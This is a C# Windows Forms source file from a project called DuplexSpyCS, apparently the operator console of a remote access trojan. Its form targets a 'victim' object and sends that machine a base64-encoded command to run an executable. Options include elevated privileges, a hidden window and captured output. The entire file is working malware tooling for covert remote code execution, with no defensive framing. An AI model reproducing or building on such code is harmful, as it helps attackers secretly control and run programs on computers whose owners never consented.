using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFileMgrExec : Form
    {
        public clsVictim v;
        public string szRemoteExecutable = string.Empty;
        public string szCurrentDir = string.Empty;

        public frmFileMgrExec()
        {
            InitializeComponent();
        }

        private void Req_ExecFile(string filePath, string fileParams, bool runAs, bool bOutput, bool bCreateNoWindow, bool bTimeout, int nTimeout)
        {
            string BooleanToIntString(bool bVal) => bVal ? "1" : "0";

            v.SendCommand(string.Join("|", new string[]
            {
                "exec",
                "file",
                BooleanToIntString(runAs),
                BooleanToIntString(bOutput),
                BooleanToIntString(bCreateNoWindow),
                BooleanToIntString(bTimeout),
                nTimeout.ToString(),
                clsCrypto.b64E2Str(filePath),
                clsCrypto.b64E2Str(fileParams),
            }));
        }

        void setup()
        {
            textBox1.Text = szRemoteExecutable;
        }

        private void frmFileMgrExec_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string szPath = textBox1.Text.Contains(":") ? textBox1.Text : Path.Combine(szCurrentDir, textBox1.Text);
            new Thread(() => Req_ExecFile(szPath, textBox2.Text, checkBox1.Checked, checkBox2.Checked, checkBox3.Checked, checkBox4.Checked, (int)numericUpDown1.Value)).Start();
        }
    }
}
